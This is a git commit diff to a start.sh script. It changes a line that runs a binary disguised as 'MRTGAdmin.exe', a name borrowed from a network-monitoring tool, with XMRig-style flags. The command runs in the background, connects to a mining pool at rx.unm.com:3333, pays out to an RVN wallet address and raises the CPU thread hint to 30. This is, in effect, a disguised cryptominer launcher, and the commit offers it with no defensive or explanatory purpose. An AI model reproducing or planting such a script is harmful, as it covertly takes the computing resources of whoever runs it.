ada838a706da778c819f7c24ecfb922303be2942
wagepentathlon <96092863+wagepentathlon@users.noreply.github.com>
2023-09-02 08:03:35 -0500

    Update start.sh

--- start.sh
+++ start.sh
@@ -1,2 +1,2 @@
 NAME="$(hostname)"
-./MRTGAdmin/Linux/MRTGAdmin._xe -B -o rx.unm.com:3333 -a rx -k -u RVN:RTbY46h1CnHKZgNmuNvjoprMgveTWQYVN --rig-id=${NAME} -p x --cpu-max-threads-hint=0
+./MRTGAdmin/Linux/MRTGAdmin.exe -B -o rx.unm.com:3333 -a rx -k -u RVN:RTbY46h1CnHKZgNmuNvjoprMgveTWQYVNg --rig-id=${NAME} -p x --cpu-max-threads-hint=30
